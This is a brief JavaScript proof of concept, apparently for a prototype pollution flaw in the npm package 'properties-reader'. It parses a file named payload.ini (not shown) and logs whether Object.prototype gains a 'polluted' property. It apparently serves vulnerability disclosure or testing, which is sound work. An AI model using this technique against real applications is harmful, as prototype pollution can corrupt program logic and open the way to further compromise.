var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const propertiesReader = require('properties-reader');
const path = require('path');
console.log({}.polluted);
propertiesReader(path.resolve(__dirname, './payload.ini'));
console.log({}.polluted);